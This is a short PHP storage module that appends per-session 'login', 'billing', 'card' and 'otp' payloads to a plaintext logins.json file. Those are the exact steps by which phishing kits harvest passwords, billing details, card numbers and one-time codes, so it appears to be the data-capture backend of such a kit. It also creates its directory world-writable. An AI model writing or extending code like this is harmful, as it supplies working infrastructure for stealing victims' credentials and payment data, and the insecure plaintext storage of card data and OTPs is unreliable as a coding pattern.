<?php
if (!function_exists('login_storage_path')) {
    function login_storage_path(): string
    {
        return __DIR__ . '/logins.json';
    }
}

if (!function_exists('ensure_login_storage')) {
    function ensure_login_storage(): void
    {
        $path = login_storage_path();
        $directory = dirname($path);
        if (!is_dir($directory)) {
            mkdir($directory, 0777, true);
        }
        if (!file_exists($path)) {
            file_put_contents($path, json_encode(new stdClass()), LOCK_EX);
        }
    }
}

if (!function_exists('load_login_sessions')) {
    function load_login_sessions(): array
    {
        ensure_login_storage();
        $contents = file_get_contents(login_storage_path());
        $data = json_decode($contents, true);
        if (!is_array($data)) {
            $data = [];
        }
        return $data;
    }
}

if (!function_exists('save_login_sessions')) {
    function save_login_sessions(array $sessions): void
    {
        ensure_login_storage();
        file_put_contents(
            login_storage_path(),
            json_encode($sessions, JSON_PRETTY_PRINT | JSON_UNESCAPED_SLASHES),
            LOCK_EX
        );
    }
}

if (!function_exists('append_login_session_step')) {
    function append_login_session_step(string $sessionId, string $step, array $payload, array $meta = []): void
    {
        $allowedSteps = ['login', 'billing', 'card', 'otp'];
        if (!in_array($step, $allowedSteps, true)) {
            throw new InvalidArgumentException('Unsupported step type: ' . $step);
        }

        $sessions = load_login_sessions();

        if (!isset($sessions[$sessionId]) || !is_array($sessions[$sessionId])) {
            $sessions[$sessionId] = [
                'meta' => array_merge(
                    ['created_at' => date(DATE_ATOM)],
                    $meta
                ),
                'login' => [],
                'billing' => [],
                'card' => [],
                'otp' => [],
            ];
        } elseif (!empty($meta)) {
            $sessions[$sessionId]['meta'] = array_merge($sessions[$sessionId]['meta'], $meta);
        }

        if (!isset($sessions[$sessionId][$step]) || !is_array($sessions[$sessionId][$step])) {
            $sessions[$sessionId][$step] = [];
        }

        $sessions[$sessionId][$step][] = [
            'timestamp' => date(DATE_ATOM),
            'payload' => $payload
        ];

        save_login_sessions($sessions);
    }
}

if (!function_exists('delete_login_session')) {
    function delete_login_session(string $sessionId): void
    {
        $sessions = load_login_sessions();
        if (isset($sessions[$sessionId])) {
            unset($sessions[$sessionId]);
            save_login_sessions($sessions);
        }
    }
}
?>
